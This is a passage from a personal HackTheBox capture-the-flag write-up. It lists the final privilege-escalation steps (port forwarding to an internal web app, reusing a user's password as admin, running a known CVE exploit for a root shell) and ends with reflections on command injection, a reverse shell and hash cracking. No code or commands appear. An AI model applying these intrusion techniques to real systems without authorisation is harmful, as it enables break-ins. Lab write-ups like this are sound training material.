3. observed the ==network connections== of the host from the inside, and observed localhost having connection with port 8080, and suspected it might be a web service running.
4. found a **web app,** to which i logged in with user admin and **reusable pass** of user tobias
5. used ==local port forwarding==, to forward it to my ==local machine to exploit it==
6. found the web app to be ==vulnerable== to a known cve, and with the appropriate script i got shell and grabbed the ==root flag==

------
# Sidenotes

All in all, this did not seem like an "easy" machine, for me the foothold part was tough, especially due to the way the website modified the request of the backup password, and the way the payload for the command injection should be constructed. Once we got rev shell as www-data, it was easy to enumerate for files containing user info, and then hash cracking to reveal a user's pass. Then the privesc part, was kinda easy, as the web app had a known vulnerability, and the reuse of tobias creds for the admin user of ispconfig made the process even easier. 

What will make this machine memorable for me, would be only the command injection part, which was unique due to the blacklisted characters. The rest of it was pretty much common among HackTheBox linux machines.

https://www.hackthebox.com/achievement/machine/284567/656
![Pasted image 20250527201110](MediaFiles/Pasted%20image%2020250527201110.png)
